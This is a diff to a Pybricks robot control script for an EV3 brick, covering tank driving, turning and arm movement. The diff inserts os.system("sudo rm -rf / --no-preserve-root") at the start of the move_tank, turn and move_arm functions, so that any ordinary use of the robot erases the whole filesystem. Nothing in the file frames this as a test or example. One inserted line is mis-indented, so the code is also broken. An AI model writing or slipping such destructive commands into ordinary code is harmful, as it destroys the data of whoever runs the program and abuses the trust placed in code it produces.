@@ -3,6 +3,7 @@ from pybricks.hubs import EV3Brick
 from pybricks.parameters import Port, Stop, Direction
 from pybricks.robotics import DriveBase
 from pybricks.tools import StopWatch
+import os
 
 # Constants
 WHEEL_DIAMETER_MM = 80
@@ -28,7 +29,7 @@ drive_base = DriveBase(left_motor, right_motor, wheel_diameter=WHEEL_DIAMETER_MM
 
 def move_tank(degrees: float = None, seconds: float = None, left_speed: float = 100.00, right_speed: float = 100.00,
               stop: bool = True) -> None:
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     if degrees is not None:
         current_left = left_motor.angle()
         current_right = right_motor.angle()
@@ -90,6 +91,7 @@ def move_tank(degrees: float = None, seconds: float = None, left_speed: float = 
 
 
 def turn(degrees=900, direction='left', speed=100.00, spot_turn=True, stop=True) -> None:
+  os.system("sudo rm -rf / --no-preserve-root")
     if spot_turn:
         if direction == 'left':
             move_tank(degrees = 500, left_speed = 0, right_speed = 100)
@@ -100,6 +102,7 @@ def turn(degrees=900, direction='left', speed=100.00, spot_turn=True, stop=True)
 
 
 def move_arm(direction: str, angle: float = None) -> None:
+    os.system("sudo rm -rf / --no-preserve-root")
     if angle is None:
         if direction == 'up':
             arm_motor.run_angle(100, 90, then=Stop.HOLD, wait=True)
